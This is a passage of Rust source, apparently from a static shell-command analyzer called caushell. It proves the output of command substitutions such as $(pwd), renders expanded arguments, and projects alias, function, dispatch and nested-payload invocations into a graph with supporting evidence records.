            .is_some_and(|word| word.trim_end_matches([' ', '\t', '\n']) == name)
}

fn static_entry_pwd_producer<'a>(
    registry: &ProfileRegistry,
    ctx: &RunnerContext,
    entry: &ExpandedFrontierEntry,
    command: &'a caushell_parse::CommandFact,
) -> Option<&'a caushell_parse::CommandSubstitutionFact> {
    if !static_entry_command(ctx, entry, command)
        || !ctx.evidence.iter().any(|e| matches!(&e.kind,
            caushell_types::EvidenceKind::StaticBashEntryVariable { name } if name == "PWD"))
    {
        return None;
    }
    let request = ctx.request();
    let raw = &request.command;
    // Bind the first substitution after literal words at shell entry. No
    // prior shell statement or expanding argument can change the builtin or
    // the logical directory before this occurrence.
    let token = command.tokens.iter().find(|token| {
        caushell_parse::decode_static_shell_argument(&token.text, token.quoted, &token.node_kind).is_none()
            || !token.command_substitutions.is_empty()
    })?;
    let [producer] = token.command_substitutions.as_slice() else {
        return None;
    };
    let state = &request.shell_state_before;
    if producer.body_text.trim_matches([' ', '\t', '\n']) != "pwd"
        || !registry.lookup("pwd").profile.is_some_and(|profile| {
            profile.trust.source == caushell_profile::ProfileSourceKind::BuiltIn
        })
        || state.environment.iter().map(|v| v.name.as_str())
            .chain(state.variables.iter().map(|v| v.name.as_str()))
            .any(|name| name.starts_with("LD_") || name.starts_with("DYLD_"))
        || !caushell_parse::parse_process_substitutions(raw, request.shell_kind)
            .is_ok_and(|substitutions| substitutions.is_empty())
    {
        return None;
    }
    Some(producer)
}

fn static_entry_path_stdout<'a>(
    registry: &ProfileRegistry,
    ctx: &RunnerContext,
    entry: &ExpandedFrontierEntry,
    command: &'a caushell_parse::CommandFact,
    entry_pwd: Option<&caushell_parse::CommandSubstitutionFact>,
) -> Option<(&'a caushell_parse::CommandSubstitutionFact, String)> {
    use caushell_profile::{CommandLookupDomain, ProfileSourceKind};

    let domain = entry.bindings.command_lookup_domain();
    if !static_entry_command(ctx, entry, command)
        || command.in_pipeline
        || command.guarded
        || command.terminator == Some(caushell_parse::StatementTerminator::Background)
        || !entry.parsed_scope.redirections.is_empty()
        || !matches!(domain, CommandLookupDomain::Shell)
        || !ctx.evidence.iter().any(|e| matches!(&e.kind,
            caushell_types::EvidenceKind::StaticBashEntryVariable { name } if name == "IFS"))
    {
        return None;
    }
    let request = ctx.request();
    let state = &request.shell_state_before;
    let has_lookup_override = state
        .environment
        .iter()
        .map(|value| value.name.as_str())
        .chain(state.variables.iter().map(|value| value.name.as_str()))
        .any(|name| {
            matches!(name, "PATH" | "BASH_CMDS")
                || name.starts_with("LD_")
                || name.starts_with("DYLD_")
        });
    if has_lookup_override
        || !caushell_parse::parse_process_substitutions(&request.command, request.shell_kind)
            .is_ok_and(|substitutions| substitutions.is_empty())
    {
        return None;
    }

    // An earlier unproved expansion could change the lookup namespace.
    // Literal fields and the independently proved entry pwd are admissible.
    let token = command.tokens.iter().find(|token| {
        if entry_pwd.is_some_and(|pwd| {
            token.text == pwd.text
                && token.command_substitutions.as_slice() == std::slice::from_ref(pwd)
        }) {
            return false;
        }
        !token.command_substitutions.is_empty()
            || caushell_parse::decode_static_shell_argument(
                &token.text, token.quoted, &token.node_kind,
            ).is_none()
    })?;
    let [substitution] = token.command_substitutions.as_slice() else {
        return None;
    };
    let parsed = caushell_parse::parse_command(&substitution.body_text, entry.shell_kind).ok()?;
    let producer = crate::support::plain_single_producer(&parsed)?;
    let name = producer.command_name.as_deref()?;
    let profile = registry.lookup_in_domain(name, false, domain).profile?;
    if producer.command_name_runtime_data
        || name != profile.primary_name()
        || profile.trust.source != ProfileSourceKind::BuiltIn
        || entry.bindings.profile_has_alias_shadow(name)
        || entry.bindings.function_binding(name).is_some()
    {
        return None;
    }
    let decoder = profile.native_path_stdout?;
    let projection = caushell_profile::project_invocation(
        producer,
        InvocationRuntimeContext::new().with_shell_kind(entry.shell_kind),
    );
    let args = projection.args.iter().map(|arg| {
        caushell_profile::argument_structure(arg).exact_value().map(str::to_owned)
    }).collect::<Option<Vec<_>>>()?;
    let output = decoder.output(&args)?;
    Some((substitution, output.trim_end_matches('\n').to_string()))
}

fn static_substitution_argument_fields(
    command: &caushell_parse::CommandFact,
    session: caushell_query::QuerySession<'_>,
    shell_kind: caushell_types::ShellKind,
    sequence_no: caushell_types::CommandSequenceNo,
    bindings: &SessionBindings,
    cwd: &str,
    cwd_reliable: bool,
    home: Option<&str>,
    remaining_depth: u8,
    entry_pwd: Option<&caushell_parse::CommandSubstitutionFact>,
    entry_path_stdout: Option<(&caushell_parse::CommandSubstitutionFact, &str)>,
) -> Vec<caushell_profile::ArgumentFieldsProof> {
    use caushell_profile::ShellFieldFragment::UnquotedExpansion;
    if shell_kind != caushell_types::ShellKind::Bash || remaining_depth == 0 {
        return Vec::new();
    }
    command
        .tokens
        .iter()
        .filter_map(|token| {
            if token.command_substitutions.is_empty()
                || token.runtime_data
                || token.implicit_input_source.is_some()
                || token.runtime_argument_domain.is_some()
            {
                return None;
            }
            let start = token.span.start_byte.checked_sub(command.span.start_byte)?;
            let end = token.span.end_byte.checked_sub(command.span.start_byte)?;
            let original = command.text.get(start..end)?;
            let output = |text: &str| {
                if let Some(pwd) = entry_pwd
                    && pwd.text == text
                    && token.command_substitutions.as_slice() == std::slice::from_ref(pwd)
                {
                    // Command substitution removes the builtin's newline and
                    // any trailing newlines in the directory name itself.
                    return Some(cwd.trim_end_matches('\n').to_owned());
                }
                if let Some((producer, output)) = entry_path_stdout
                    && producer.text == text
                    && token.command_substitutions.as_slice() == std::slice::from_ref(producer)
                {
                    return Some(output.to_owned());
                }
                crate::support::static_command_substitution_output_with_cwd(
                    text,
                    session,
                    shell_kind,
                    sequence_no,
                    bindings,
                    cwd,
                    home,
                    remaining_depth,
                    cwd_reliable,
                )
            };
            let fragments = if let Some(parts) =
                caushell_parse::scalar_word_parts(&token.text, token.quoted, &token.node_kind, true)
            {
                caushell_profile::materialize_shell_field_fragments(parts, bindings, output)?
            } else if !token.quoted
                && token.command_substitutions.len() == 1
                && original == token.command_substitutions[0].text
            {
                vec![UnquotedExpansion(output(original)?)]
            } else {
                return None;
            };
            use caushell_profile::ArgumentFieldLayout;
            let layout = caushell_profile::materialize_bash_field_fragments(&fragments, bindings)
                .map(ArgumentFieldLayout::Exact)
                .or_else(|| {
                    caushell_profile::OptionalBashField::from_fragments(&fragments)
                        .map(ArgumentFieldLayout::Optional)
                })?;
            Some(caushell_profile::ArgumentFieldsProof {
                span: token.span.clone(),
                source_word: token.text.clone(),
                layout,
            })
        })
        .collect()
}

/// Both policy/path consumers and the diagnostic child use this one field
/// proof. Rebind through the complete native profile; never clear a risk flag.
fn refresh_substitution_argument_fields(
    registry: &ProfileRegistry,
    session: SessionView<'_>,
    request: &CheckRequest,
    entry: &mut ExpandedFrontierEntry,
    context: &ProgramSourceContext,
    max_depth: u8,
    ctx: &mut RunnerContext,
) -> Vec<caushell_profile::ArgumentFieldsProof> {
    // Dispatch receives argv already expanded in the launcher's shell frame.
    // An unresolved historical source token must not be evaluated again using
    // the callee's environment or executable namespace.
    if entry.depth >= max_depth || entry.origin_kind == ExecutionUnitOriginKind::Dispatch {
        return Vec::new();
    }
    let Some(command) = entry
        .parsed_scope
        .commands
        .get(entry.command_ref.command_index)
    else {
        return Vec::new();
    };
    if !command
        .tokens
        .iter()
        .any(|t| !t.runtime_data && !t.command_substitutions.is_empty())
    {
        return Vec::new();
    }
    // Preserve the executable/module namespace and every unresolved lookup.
    let normalized = match &entry.result {
        ResolveInvocationArtifactResult::Resolved(r) => &r.normalized_command_name,
        ResolveInvocationArtifactResult::SelectionError {
            normalized_command_name,
            error,
            ..
        } if matches!(
            error,
            caushell_profile::BindError::NoFormMatched { .. }
                | caushell_profile::BindError::MultipleFormsMatched { .. }
                | caushell_profile::BindError::UnsupportedProfileFeature { .. }
        ) =>
        {
            normalized_command_name
        }
        _ => return Vec::new(),
    };
    if registry
        .lookup(command.command_name.as_deref().unwrap_or(""))
        .normalized_command_name
        != *normalized
    {
        return Vec::new();
    }
    let index = program_command_index(entry);
    let observations = source_scope_observations(
        registry,
        request,
        &entry.parsed_scope,
        index,
        program_scope_bindings(entry),
    );
    let cwd = super::compute_effective_cwd::source_scope_execution_cwds(
        &entry.parsed_scope,
        request,
        &context.entry_cwd,
        &observations,
    )
    .0
    .get(index)
    .cloned()
    .unwrap_or(caushell_runner::EffectiveCwd::Unknown);
    let cwd_reliable = !entry.inherited_scope.static_input_cwd_unproven && cwd.as_known().is_some();
    let entry_pwd = cwd.as_known()
        .filter(|path| cwd_reliable && *path == request.shell_state_before.cwd())
        .and_then(|_| static_entry_pwd_producer(registry, ctx, entry, command));
    let entry_path_stdout = static_entry_path_stdout(registry, ctx, entry, command, entry_pwd);
    let fields = static_substitution_argument_fields(
        command,
        caushell_query::QuerySession::from_session(&session),
        entry.shell_kind,
        request.sequence_no,
        &entry.bindings,
        cwd.as_known()
            .unwrap_or_else(|| request.shell_state_before.cwd()),
        cwd_reliable,
        request.home.as_deref(),
        max_depth - entry.depth,
        entry_pwd,
        entry_path_stdout.as_ref().map(|(producer, output)| (*producer, output.as_str())),
    );
    if fields.is_empty()
        || (*normalized != "find" && fields.iter().all(|proof| proof.exact_fields().is_none()))
    {
        return Vec::new();
    }
    let (shapes, runtime) = match &entry.result {
        ResolveInvocationArtifactResult::Resolved(r) => (
            r.projection
                .args
                .iter()
                .filter_map(|a| a.substitution_output_proof().map(|proof| (a.span.clone(), proof)))
                .collect(),
            InvocationRuntimeContext {
                shell_kind: entry.shell_kind,
                stdin_payload_available: r
                    .materialized_projection
                    .invocation
                    .stdin_payload_available,
                interactive_session: r.materialized_projection.invocation.interactive_session,
            },
        ),
        _ => (
            Vec::new(),
            runtime_context_for_parsed_command(
                &entry.parsed_scope,
                entry.command_ref.command_index,
                command,
            ),
        ),
    };
    entry.result = caushell_profile::resolve_invocation_artifact_with_argument_proofs(
        registry,
        command,
        runtime,
        &entry.bindings,
        &shapes,
        &fields,
    );
    let materialized_command = render_command_with_argument_fields(command, &fields);
    for (index, (proof, exact)) in fields.iter()
        .filter_map(|proof| Some((proof, proof.exact_fields()?)))
        .enumerate()
    {
        ctx.add_evidence(Evidence {
            rule_id: caushell_types::RuleId::SelectionError,
            summary: "complete static shell argument fields".into(),
            kind: caushell_types::EvidenceKind::ShellArgumentFields(
                caushell_types::ShellArgumentFieldsEvidence {
                    node_id: entry.source_node_id.0.clone(),
                    source_start_byte: proof.span.start_byte,
                    source_end_byte: proof.span.end_byte,
                    source_word: proof.source_word.clone(),
                    fields: exact.to_vec(),
                    materialized_command: (index == 0)
                        .then(|| materialized_command.clone())
                        .flatten(),
                },
            ),
        });
    }
    fields
}

fn render_command_with_argument_fields(
    command: &caushell_parse::CommandFact,
    proofs: &[caushell_profile::ArgumentFieldsProof],
) -> Option<String> {
    let mut edits = Vec::new();
    let mut expanded = false;
    for token in &command.tokens {
        if token.command_substitutions.is_empty() && !token.runtime_data {
            continue;
        }
        if token.implicit_input_source.is_some() || token.runtime_argument_domain.is_some() {
            return None;
        }
        let start = token.span.start_byte.checked_sub(command.span.start_byte)?;
        let end = token.span.end_byte.checked_sub(command.span.start_byte)?;
        if token.runtime_data {
            edits.push((start, end, shell_quote_arg(&token.text)));
            continue;
        }
        let proof = proofs
            .iter()
            .find(|p| p.span == token.span && p.source_word == token.text)?;
        edits.push((
            start,
            end,
            proof
                .exact_fields()?
                .iter()
                .map(shell_quote_arg)
                .collect::<Vec<_>>()
                .join(" "),
        ));
        expanded = true;
    }
    if !expanded {
        return None;
    }
    edits.sort_by_key(|e| e.0);
    let mut out = String::new();
    let mut cursor = 0;
    for (start, end, replacement) in edits {
        out.push_str(command.text.get(cursor..start)?);
        out.push_str(&replacement);
        cursor = end;
    }
    out.push_str(command.text.get(cursor..)?);
    (out.len() <= 262_144).then_some(out)
}

fn expanded_virtual_node_id(
    kind: &str,
    parent_node_id: &caushell_graph::NodeId,
    child_index: usize,
) -> caushell_graph::NodeId {
    caushell_graph::NodeId::new(format!(
        "expanded-{kind}:{}:{child_index}",
        parent_node_id.0
    ))
}

fn expanded_virtual_node_id_with_suffix(
    kind: &str,
    parent_node_id: &caushell_graph::NodeId,
    suffix: &str,
) -> caushell_graph::NodeId {
    caushell_graph::NodeId::new(format!("expanded-{kind}:{}:{suffix}", parent_node_id.0))
}

fn shell_quote_arg(text: impl AsRef<str>) -> String {
    let text = text.as_ref();
    if text.is_empty() {
        return "''".to_string();
    }

    let escaped = text.replace('\'', "'\"'\"'");
    format!("'{escaped}'")
}

fn project_dispatch_derived_invocation_mutation(
    request: &caushell_types::CheckRequest,
    command: &TopLevelDispatchDerivedCommand,
) -> PendingMutation {
    PendingMutation::AddDerivedInvocation {
        node_id: dispatch_derived_invocation_node_id(
            &request.session_id,
            request.sequence_no,
            command.source_command_index,
            command.dispatch_index,
        ),
        root_command_sequence_no: request.sequence_no,
        origin: DerivedInvocationOrigin::Dispatch {
            source_command_index: command.source_command_index,
            dispatch_index: command.dispatch_index,
            command_slot: command.command_slot.clone(),
        },
        derived_command_index: command.dispatch_index,
        raw_text: command.command.text.clone(),
        command_name: command.command.command_name.clone(),
        shell_kind: request.shell_kind,
        depth: 1,
        parent_node_id: command.parent_node_id.clone(),
        relation_from_parent: caushell_graph::EdgeKind::Dispatches,
    }
}

fn project_dispatch_records(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    records: &[ExecutionUnitResolveRecord],
) -> Vec<DispatchProjectionRecord> {
    records.iter().filter_map(|record| {
        let ResolveInvocationArtifactResult::Resolved(resolved) = &record.result else {
            return None;
        };
        if should_skip_generic_dispatch_projection(resolved) {
            return None;
        }
        Some(DispatchProjectionRecord {
            source_node_id: record.source_node_id.clone(),
            command_ref: record.command_ref.clone(),
            projection: dispatch_projection_for_resolved(
                registry, resolved, request.shell_state_before.cwd(), request.home.as_deref(),
            ),
        })
    }).collect()
}

fn project_alias_derived_invocation_mutation(
    request: &caushell_types::CheckRequest,
    command: &TopLevelAliasDerivedCommand,
) -> PendingMutation {
    PendingMutation::AddDerivedInvocation {
        node_id: alias_derived_invocation_node_id(
            &request.session_id,
            request.sequence_no,
            command.source_command_index,
            command.alias_hop_index,
        ),
        root_command_sequence_no: request.sequence_no,
        origin: DerivedInvocationOrigin::AliasExpansion {
            source_command_index: command.source_command_index,
            alias_name: command.alias_name.clone(),
        },
        derived_command_index: command.alias_hop_index,
        raw_text: command.command.text.clone(),
        command_name: command.command.command_name.clone(),
        shell_kind: request.shell_kind,
        depth: 1,
        parent_node_id: command.parent_node_id.clone(),
        relation_from_parent: caushell_graph::EdgeKind::ExpandsTo,
    }
}

fn project_function_derived_invocation_mutation(
    request: &caushell_types::CheckRequest,
    command: &TopLevelFunctionDerivedCommand,
) -> PendingMutation {
    PendingMutation::AddDerivedInvocation {
        node_id: function_derived_invocation_node_id(
            &request.session_id,
            request.sequence_no,
            command.source_command_index,
            command.derived_command_index,
        ),
        root_command_sequence_no: request.sequence_no,
        origin: DerivedInvocationOrigin::FunctionExpansion {
            source_command_index: command.source_command_index,
            function_name: command.function_name.clone(),
        },
        derived_command_index: command.derived_command_index,
        raw_text: command.command.text.clone(),
        command_name: command.command.command_name.clone(),
        shell_kind: request.shell_kind,
        depth: 1,
        parent_node_id: command.parent_node_id.clone(),
        relation_from_parent: caushell_graph::EdgeKind::ExpandsTo,
    }
}

fn project_execution_unit_derived_invocation_mutations(
    request: &caushell_types::CheckRequest,
    staged_mutations: &[PendingMutation],
    execution_unit_records: &[ExecutionUnitResolveRecord],
) -> Vec<PendingMutation> {
    let mut known_execution_unit_node_ids: std::collections::BTreeSet<caushell_graph::NodeId> =
        staged_mutations
            .iter()
            .filter_map(|mutation| match mutation {
                PendingMutation::AddTopLevelCommandInvocation { node_id, .. }
                | PendingMutation::AddDerivedInvocation { node_id, .. } => Some(node_id.clone()),
                _ => None,
            })
            .collect();
    known_execution_unit_node_ids.extend(
        execution_unit_records
            .iter()
            .filter(|record| record.origin_kind == ExecutionUnitOriginKind::TopLevel)
            .map(|record| record.source_node_id.clone()),
    );
    let mut records = execution_unit_records.iter().collect::<Vec<_>>();
    records.sort_by(|left, right| {
        left.depth
            .cmp(&right.depth)
            .then_with(|| left.source_node_id.0.cmp(&right.source_node_id.0))
    });

    let mut mutations = Vec::new();
    for record in records {
        if !known_execution_unit_node_ids.contains(&record.parent_execution_node_id)
            || known_execution_unit_node_ids.contains(&record.source_node_id)
        {
            continue;
        }
        let Some(mutation) = project_execution_unit_derived_invocation_mutation(request, record)
        else {
            continue;
        };
        known_execution_unit_node_ids.insert(record.source_node_id.clone());
        mutations.push(mutation);
    }

    mutations
}

fn project_execution_unit_derived_invocation_mutation(
    request: &caushell_types::CheckRequest,
    record: &ExecutionUnitResolveRecord,
) -> Option<PendingMutation> {
    let (origin, relation_from_parent) = match record.origin_kind {
        ExecutionUnitOriginKind::FunctionExpansion => {
            let ExecutionUnitOriginLocator::FunctionExpansion { function_name } =
                &record.origin_locator
            else {
                return None;
            };
            (
                DerivedInvocationOrigin::FunctionExpansion {
                    source_command_index: record.root_command_index,
                    function_name: function_name.clone(),
                },
                caushell_graph::EdgeKind::ExpandsTo,
            )
        }
        ExecutionUnitOriginKind::Dispatch => (
            DerivedInvocationOrigin::Dispatch {
                source_command_index: record.root_command_index,
                dispatch_index: record.origin_index,
                command_slot: "nested_dispatch".to_string(),
            },
            caushell_graph::EdgeKind::ExpandsTo,
        ),
        ExecutionUnitOriginKind::ShellCommandStringPayload => (
            DerivedInvocationOrigin::ShellCommandStringPayload {
                command_index: record.origin_index,
            },
            caushell_graph::EdgeKind::ExpandsTo,
        ),
        ExecutionUnitOriginKind::CommandSubstitutionBody => {
            let origin = match &record.origin_locator {
                ExecutionUnitOriginLocator::CommandSubstitutionBody {
                    token_index,
                    substitution_index,
                } => DerivedInvocationOrigin::CommandSubstitutionBody {
                    parent_node_id: record.parent_execution_node_id.0.clone(),
                    token_index: *token_index,
                    substitution_index: *substitution_index,
                },
                ExecutionUnitOriginLocator::CommandSubstitutionAssignmentValue {
                    assignment_command_index,
                    assignment_index,
                    substitution_index,
                    ..
                } => DerivedInvocationOrigin::CommandSubstitutionAssignmentValue {
                    parent_node_id: record.parent_execution_node_id.0.clone(),
                    assignment_command_index: *assignment_command_index,
                    assignment_index: *assignment_index,
                    substitution_index: *substitution_index,
                },
                ExecutionUnitOriginLocator::ShellEvaluation {
                    scope_key,
                    source_start_byte,
                    site_index,
                    substitution_index,
                    ..
                } => DerivedInvocationOrigin::ShellEvaluation {
                    parent_node_id: record.parent_execution_node_id.0.clone(),
                    scope_key: scope_key.clone(),
                    source_start_byte: *source_start_byte,
                    site_index: *site_index,
                    substitution_index: *substitution_index,
                },
                _ => return None,
            };
            (origin, caushell_graph::EdgeKind::DependsOn)
        }
        ExecutionUnitOriginKind::CommandSubstitutionMaterialization => (
            DerivedInvocationOrigin::CommandSubstitutionMaterialization {
                parent_node_id: record.parent_execution_node_id.0.clone(),
                command_index: record.origin_index,
            },
            caushell_graph::EdgeKind::DependsOn,
        ),
        ExecutionUnitOriginKind::ProcessSubstitutionBody => {
            let ExecutionUnitOriginLocator::ProcessSubstitutionBody {
                location_kind,
                outer_index,
                location_subindex,
                substitution_index,
            } = &record.origin_locator
            else {
                return None;
            };
            (
                DerivedInvocationOrigin::ProcessSubstitutionBody {
                    parent_node_id: record.parent_execution_node_id.0.clone(),
                    location_kind: match location_kind {
                        ProcessSubstitutionLocationKind::Argument => "argument".to_string(),
                        ProcessSubstitutionLocationKind::ArgumentWord => "argument_word".to_string(),
                        ProcessSubstitutionLocationKind::Redirection => "redirection".to_string(),
                    },
                    outer_index: *outer_index,
                    location_subindex: *location_subindex,
                    substitution_index: *substitution_index,
                },
                caushell_graph::EdgeKind::DependsOn,
            )
        }
        ExecutionUnitOriginKind::StaticXargs => (
            DerivedInvocationOrigin::StaticXargs {
                child_index: record.origin_index,
            },
            caushell_graph::EdgeKind::ExpandsTo,
        ),
        ExecutionUnitOriginKind::RecursivePayload => (
            DerivedInvocationOrigin::RecursivePayload {
                parent_node_id: record.parent_execution_node_id.0.clone(),
                command_index: record.origin_index,
            },
            caushell_graph::EdgeKind::ExpandsTo,
        ),
        _ => return None,
    };

    let command_name = match &record.result {
        ResolveInvocationArtifactResult::Resolved(resolved) => {
            Some(resolved.normalized_command_name.clone())
        }
        ResolveInvocationArtifactResult::MissingCommandName { .. }
        | ResolveInvocationArtifactResult::NoProfile { .. }
        | ResolveInvocationArtifactResult::SelectionError { .. } => record
            .parsed_scope
            .commands
            .get(record.command_ref.command_index)
            .and_then(|command| command.command_name.clone()),
    };

    Some(PendingMutation::AddDerivedInvocation {
        node_id: record.source_node_id.clone(),
        root_command_sequence_no: request.sequence_no,
        origin,
        derived_command_index: record.command_ref.command_index,
        raw_text: record.rendered_command_text.clone(),
        command_name,
        shell_kind: record.shell_kind,
        depth: record.depth,
        parent_node_id: record.parent_execution_node_id.clone(),
        relation_from_parent,
    })
}

fn project_derived_invocation_mutations(
    request: &caushell_types::CheckRequest,
    record: &NestedPayloadRecord,
) -> Vec<PendingMutation> {
    let NestedPayloadResolution::Parsed { shell_kind, parsed } = &record.resolution else {
        return Vec::new();
    };

    parsed
        .commands
        .iter()
        .enumerate()
        .map(
            |(derived_command_index, command)| PendingMutation::AddDerivedInvocation {
                node_id: derived_invocation_node_id(
                    &request.session_id,
                    request.sequence_no,
                    record.record_id.0,
                    derived_command_index,
                ),
                root_command_sequence_no: request.sequence_no,
                origin: DerivedInvocationOrigin::NestedPayload {
                    nested_record_id: record.record_id.0,
                },
                derived_command_index,
                raw_text: command.text.clone(),
                command_name: command.command_name.clone(),
                shell_kind: *shell_kind,
                depth: record.depth,
                parent_node_id: nested_payload_node_id(
                    &request.session_id,
                    request.sequence_no,
                    record.record_id.0,
                ),
                relation_from_parent: caushell_graph::EdgeKind::ExpandsTo,
            },
        )
        .collect()
}

fn project_nested_payload_mutation(
    request: &caushell_types::CheckRequest,
    record: &NestedPayloadRecord,
) -> PendingMutation {
    let parent_node_id = nested_parent_node_id(request, &record.parent_ref);
    PendingMutation::AddNestedPayload {
        node_id: nested_payload_node_id(
            &request.session_id,
            request.sequence_no,
            record.record_id.0,
        ),
        root_command_sequence_no: request.sequence_no,
        root_command_index: record.root_command_index,
        record_id: record.record_id.0,
        depth: record.depth,
        language: nested_language_string(record.candidate.candidate.language),
        source: nested_source_string(record.candidate.candidate.source),
        origin_kind: nested_origin_kind_string(&record.candidate.candidate.origin),
        origin_slot: nested_origin_slot(&record.candidate.candidate.origin),
        input_kind: nested_input_kind_string(&record.candidate.candidate.input),
        input_text: nested_input_text(&record.candidate.candidate.input),
        input_fragments: nested_input_fragments(&record.candidate.candidate.input),
        input_source: nested_input_source(&record.candidate.candidate.input),
        resolution_kind: nested_resolution_kind_string(&record.resolution),
        resolution_detail: nested_resolution_detail(&record.resolution),
        resolution_runtime_input_source: nested_resolution_runtime_input_source(&record.resolution),
        relation_from_command: None,
        relation_from_parent: parent_node_id
            .as_ref()
            .map(|_| caushell_graph::EdgeKind::ExpandsTo),
        parent_node_id,
    }
}

fn project_nested_payload_evidence_with_runtime_state(
    registry: &ProfileRegistry,
    request: &CheckRequest,
    bindings: &SessionBindings,
    record: &NestedPayloadRecord,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
) -> Option<Evidence> {
    // Local stdin is normally left to provenance guards. But local input
    // presence does not prove the bytes after a runtime variable assignment.
    // Retain the existing unresolved-input evidence in that case; do not
    // manufacture a literal script or introduce a separate risk decision.
    let runtime_unknown = match &record.parent_ref {
        NestedPayloadParentRef::RootCommand { command_index } => parsed_request
            .commands
            .get(*command_index)
            .map(|command| {
                runtime_variable_overlay(
                    registry,
                    request,
                    bindings.clone(),
                    parsed_request,
                    command.span.start_byte,
                    request.sequence_no,
                )
            })
            .is_some_and(|overlay| {
                overlay.touched.iter().any(|name| {
                    overlay.bindings.get(name).is_some_and(|v| {
                        matches!(
                            v.value,
                            SessionValue::OpaqueDynamic { .. } | SessionValue::RuntimeInput { .. }
                        )
                    })
                })
            }),
        _ => false,
    };
    project_nested_payload_evidence_inner(
        record,
        parsed_request,
        !runtime_unknown,
        request.shell_state_before.cwd(),
        request.home.as_deref(),
    )
}

#[cfg(test)]
fn project_nested_payload_evidence(
    record: &NestedPayloadRecord,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
) -> Option<Evidence> {
    project_nested_payload_evidence_inner(record, parsed_request, true, "/tmp/project", None)
}

fn project_nested_payload_evidence_inner(
    record: &NestedPayloadRecord,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    allow_local_stdin_suppression: bool,
    cwd: &str,
    home: Option<&str>,
) -> Option<Evidence> {
    if allow_local_stdin_suppression
        && record.candidate.candidate.language != caushell_profile::PayloadLanguage::Opaque
        && suppress_local_stdin_nested_payload_unresolved_evidence(
            record,
            parsed_request,
            cwd,
            home,
        )
    {
        return None;
    }

    let unresolved_execution_payload_subtype = unresolved_execution_payload_subtype(record, None);
    let context = NestedPayloadContextEvidence {
        record_id: record.record_id.0,
        parent_ref: nested_parent_evidence(&record.parent_ref),
        root_command_index: record.root_command_index,
        depth: record.depth,
        language: nested_language_evidence(record.candidate.candidate.language),
        source: nested_source_evidence(record.candidate.candidate.source),
        origin: nested_origin_evidence(&record.candidate.candidate.origin),
        input: nested_input_evidence(&record.candidate.candidate.input),
    };

    match &record.resolution {
        NestedPayloadResolution::ModeledLanguage => None,
        NestedPayloadResolution::Parsed { shell_kind, parsed } => Some(
            Evidence::nested_payload_parsed(context, *shell_kind, parsed.commands.len()),
        ),
        NestedPayloadResolution::TruncatedByDepthBudget {
            max_depth,
            next_candidate_count,
        } => Some(Evidence::nested_payload_truncated(
            context,
            *max_depth,
            *next_candidate_count,
        )),
        NestedPayloadResolution::RequiresRuntimeInput { source } => {
            Some(Evidence::nested_payload_unresolved(
                context,
                NestedPayloadUnresolvedReasonEvidence::RequiresRuntimeInput { source: *source },
                unresolved_execution_payload_subtype,
            ))
        }
        NestedPayloadResolution::RequiresImplicitInput { source } => {
            Some(Evidence::nested_payload_unresolved(
                context,
                NestedPayloadUnresolvedReasonEvidence::RequiresImplicitInput { source: *source },
                unresolved_execution_payload_subtype,
            ))
        }
        NestedPayloadResolution::UnsupportedLanguage => Some(Evidence::nested_payload_unresolved(
            context,
            NestedPayloadUnresolvedReasonEvidence::UnsupportedLanguage,
            unresolved_execution_payload_subtype,
        )),
        NestedPayloadResolution::ParseFailed { shell_kind, error } => {
            Some(Evidence::nested_payload_unresolved(
                context,
                NestedPayloadUnresolvedReasonEvidence::ParseFailed {
                    shell_kind: *shell_kind,
                    error: error.clone(),
                },
                unresolved_execution_payload_subtype,
            ))
        }
        NestedPayloadResolution::UnresolvedMaterialization { materialization } => {
            Some(Evidence::nested_payload_unresolved(
                context,
                unresolved_reason_evidence(materialization),
                unresolved_execution_payload_subtype,
            ))
        }
    }
}

fn suppress_local_stdin_nested_payload_unresolved_evidence(
    record: &NestedPayloadRecord,
    parsed_request: &caushell_parse::ParsedCommandArtifact,
    cwd: &str,
    home: Option<&str>,
) -> bool {
    if !matches!(
        record.resolution,
        NestedPayloadResolution::RequiresRuntimeInput {
            source: RuntimeInputSource::StdinPayload,
        }
    ) {
        return false;
    }

    if !matches!(
        record.candidate.candidate.origin,
        caushell_profile::RecursivePayloadOrigin::FormImplicitInput
    ) {
        return false;
    }

    let NestedPayloadParentRef::RootCommand { command_index } = record.parent_ref else {
        return false;
    };

    let Some(_) = parsed_request.commands.get(command_index) else {
        return false;
    };

    // An explicit local source has its own script-source policy. Merely
    // having a producer in a pipeline proves neither the bytes nor that they
    // were parsed. Parsed literal pipelines never reach this runtime case.
    match crate::support::effective_stdin_source(parsed_request, command_index) {
        crate::support::EffectiveStdinSource::Closed => true,
        crate::support::EffectiveStdinSource::Redirect(index) => {
            let redirection = &parsed_request.redirections[index];
            redirection.kind == caushell_parse::RedirectionKind::File
                && redirection.target.as_ref().is_some_and(|target| {
                    // Only certify a concrete filename here; actual effective
                    // cwd, trust scope and provenance are checked downstream.
                    resolve_path_operand(&target.text, target.quoted, &target.node_kind, cwd, home)
                        .is_some()
                })
        }
        crate::support::EffectiveStdinSource::Inherited
        | crate::support::EffectiveStdinSource::UnknownDescriptor(_) => false,
    }
}

fn nested_parent_evidence(parent_ref: &NestedPayloadParentRef) -> NestedPayloadParentEvidence {
    match parent_ref {
        NestedPayloadParentRef::RootCommand { command_index } => {
            NestedPayloadParentEvidence::RootCommand {
                command_index: *command_index,
            }
        }
        NestedPayloadParentRef::DerivedInvocation { node_id } => {
            NestedPayloadParentEvidence::DerivedInvocation {
                node_id: node_id.0.clone(),
            }
        }
    }
}

fn runtime_context_for_top_level_command(
    parsed: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    command: &caushell_parse::CommandFact,
) -> InvocationRuntimeContext {
    runtime_context_for_parsed_command(parsed, command_index, command)
}

fn runtime_context_for_parsed_command(
    parsed: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    command: &caushell_parse::CommandFact,
) -> InvocationRuntimeContext {
    runtime_context_for_parsed_command_with_external_stdin(parsed, command_index, command, false)
}

fn runtime_context_for_process_substitution_command(
    parsed: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    command: &caushell_parse::CommandFact,
    external_stdin_payload_available: bool,
) -> InvocationRuntimeContext {
    runtime_context_for_parsed_command_with_external_stdin(
        parsed,
        command_index,
        command,
        external_stdin_payload_available,
    )
}

fn runtime_context_for_parsed_command_with_external_stdin(
    parsed: &caushell_parse::ParsedCommandArtifact,
    command_index: usize,
    command: &caushell_parse::CommandFact,
    external_stdin_payload_available: bool,
